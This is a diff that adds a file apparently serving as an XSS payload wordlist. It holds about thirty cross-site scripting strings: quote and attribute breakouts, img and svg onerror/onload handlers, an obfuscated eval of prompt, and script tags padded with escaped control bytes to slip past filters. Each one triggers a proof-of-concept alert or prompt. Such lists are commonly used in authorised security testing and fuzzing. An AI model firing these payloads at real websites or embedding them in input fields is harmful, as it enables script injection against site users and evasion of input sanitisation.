@@ -1,0 +1,41 @@
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+
+
+
+<script>javascript:alert(1)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(1)" >
+<input onfocus=javascript:alert(1) autofocus>
+
+
+
+<img \x00src=x onerror="alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+
+
+
+<script\x0A>javascript:alert(1)</script>
+<script\x0C>javascript:alert(1)</script>
+<script\x00>javascript:alert(1)</script>
+<script\x09>javascript:alert(1)</script>
+"><img src=x onerror=javascript:alert(1)>
+"><img src=x onerror=javascript:alert('1')>
+"><img src=x onerror=javascript:alert("1")>
+"><img src=x onerror=javascript:alert(`1`)>
